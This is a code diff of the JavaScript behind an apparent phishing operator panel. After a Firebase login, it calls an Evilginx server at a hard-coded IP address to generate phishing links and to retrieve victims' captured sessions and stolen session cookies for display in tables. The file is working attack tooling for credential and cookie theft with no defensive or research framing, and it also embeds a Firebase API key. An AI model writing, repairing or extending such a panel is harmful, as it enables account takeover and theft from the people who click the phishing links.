@@ -1,6 +1,6 @@
-console.log("Script.js loaded correctly");
+console.log("✅ Script.js loaded successfully");
 
-// ✅ Correct Firebase Configuration (Replace with Your Real Firebase Config)
+// ✅ Firebase Configuration (Update with your actual Firebase credentials)
 const firebaseConfig = {
     apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
     authDomain: "panel-auth-134b7.firebaseapp.com",
@@ -14,90 +14,107 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 
-// ✅ Set Evilginx Server
-const EVILGINX_SERVER = "http://3.149.242.245:5000";
+// ✅ Evilginx Server Configuration (DO NOT REMOVE)
+const EVILGINX_SERVER = "http://3.149.242.245"; // Update this
 
-// ✅ Ensure event listeners are correctly added
+// ✅ Ensure event listeners are added
 document.addEventListener("DOMContentLoaded", function () {
-    document.getElementById("loginBtn")?.addEventListener("click", login);
-    document.getElementById("logoutBtn")?.addEventListener("click", logout);
-    document.getElementById("generateLinkBtn")?.addEventListener("click", generateLink);
-    document.getElementById("fetchSessionsBtn")?.addEventListener("click", fetchCapturedSessions);
-    document.getElementById("fetchCookiesBtn")?.addEventListener("click", fetchCookies);
+    console.log("✅ DOM fully loaded");
+
+    const loginBtn = document.getElementById("loginBtn");
+    if (loginBtn) {
+        loginBtn.addEventListener("click", login);
+    }
+
+    const logoutBtn = document.getElementById("logoutBtn");
+    if (logoutBtn) {
+        logoutBtn.addEventListener("click", logout);
+    }
+
+    const generateLinkBtn = document.getElementById("generateLinkBtn");
+    if (generateLinkBtn) {
+        generateLinkBtn.addEventListener("click", generatePhishingLink);
+    }
+
+    const fetchSessionsBtn = document.getElementById("fetchSessionsBtn");
+    if (fetchSessionsBtn) {
+        fetchSessionsBtn.addEventListener("click", fetchCapturedSessions);
+    }
+
+    const fetchCookiesBtn = document.getElementById("fetchCookiesBtn");
+    if (fetchCookiesBtn) {
+        fetchCookiesBtn.addEventListener("click", fetchCapturedCookies);
+    }
 });
 
 // 🔹 LOGIN FUNCTION (Fixed)
 function login() {
+    console.log("🔹 Login function triggered");
+
     let email = document.getElementById("email").value;
     let password = document.getElementById("password").value;
 
     if (!email || !password) {
-        alert("Please enter email and password.");
+        alert("❌ Please enter email and password.");
         return;
     }
 
     auth.signInWithEmailAndPassword(email, password)
         .then(() => {
-            console.log("Login successful!");
+            console.log("✅ Login successful, redirecting to dashboard...");
             window.location.href = "dashboard.html"; // ✅ Redirect to dashboard
         })
         .catch(error => {
-            alert("Login failed: " + error.message);
+            console.error("❌ Login error:", error);
+            alert("❌ Login failed: " + error.message);
         });
 }
 
-// 🔹 LOGOUT FUNCTION (Fixed)
+// 🔹 LOGOUT FUNCTION
 function logout() {
     auth.signOut().then(() => {
+        console.log("✅ Logout successful, redirecting to login...");
         window.location.href = "index.html";
     });
 }
 
-// 🔹 GENERATE LINK FUNCTION (Fixed)
-function generateLink() {
-    fetch(`${EVILGINX_SERVER}/generate_link`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" }
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.link) {
-            document.getElementById("generatedLink").textContent = `Generated Link: ${data.link}`;
-        } else {
-            alert("Failed to generate link.");
-        }
-    })
-    .catch(error => console.error("Error generating link:", error));
+// 🔹 GENERATE EVILGINX PHISHING LINK
+function generatePhishingLink() {
+    fetch(`${EVILGINX_SERVER}/generate_link`)
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("generatedLink").textContent = data.link;
+            console.log("✅ Phishing link generated:", data.link);
+        })
+        .catch(error => console.error("❌ Error generating link:", error));
 }
 
-// 🔹 FETCH CAPTURED SESSIONS (Fixed)
+// 🔹 FETCH CAPTURED SESSIONS
 function fetchCapturedSessions() {
-    fetch(`${EVILGINX_SERVER}/sessions`)
-    .then(response => response.json())
-    .then(data => {
-        let sessionTable = document.getElementById("capturedSessionsTable");
-        sessionTable.innerHTML = "<tr><th>Email</th><th>IP</th><th>Location</th><th>Time</th></tr>";
-        
-        data.sessions.forEach(session => {
-            let row = sessionTable.insertRow();
-            row.innerHTML = `<td>${session.email}</td><td>${session.ip}</td><td>${session.location}</td><td>${session.time}</td>`;
-        });
-    })
-    .catch(error => console.error("Error fetching sessions:", error));
+    fetch(`${EVILGINX_SERVER}/captured_sessions`)
+        .then(response => response.json())
+        .then(data => {
+            let table = document.getElementById("capturedSessionsTable");
+            table.innerHTML = "<tr><th>Email</th><th>IP</th><th>Location</th><th>Time</th></tr>";
+            data.sessions.forEach(session => {
+                table.innerHTML += `<tr><td>${session.email}</td><td>${session.ip}</td><td>${session.location}</td><td>${session.time}</td></tr>`;
+            });
+            console.log("✅ Captured sessions loaded.");
+        })
+        .catch(error => console.error("❌ Error fetching sessions:", error));
 }
 
-// 🔹 FETCH COOKIES FUNCTION (Fixed)
-function fetchCookies() {
-    fetch(`${EVILGINX_SERVER}/cookies`)
-    .then(response => response.json())
-    .then(data => {
-        let cookiesTable = document.getElementById("cookiesTable");
-        cookiesTable.innerHTML = "<tr><th>Session ID</th><th>Cookie Data</th></tr>";
-
-        data.cookies.forEach(cookie => {
-            let row = cookiesTable.insertRow();
-            row.innerHTML = `<td>${cookie.session_id}</td><td>${cookie.cookie_data}</td>`;
-        });
-    })
-    .catch(error => console.error("Error fetching cookies:", error));
+// 🔹 FETCH CAPTURED COOKIES
+function fetchCapturedCookies() {
+    fetch(`${EVILGINX_SERVER}/captured_cookies`)
+        .then(response => response.json())
+        .then(data => {
+            let table = document.getElementById("cookiesTable");
+            table.innerHTML = "<tr><th>Session ID</th><th>Cookie Data</th></tr>";
+            data.cookies.forEach(cookie => {
+                table.innerHTML += `<tr><td>${cookie.session_id}</td><td>${cookie.data}</td></tr>`;
+            });
+            console.log("✅ Captured cookies loaded.");
+        })
+        .catch(error => console.error("❌ Error fetching cookies:", error));
 }
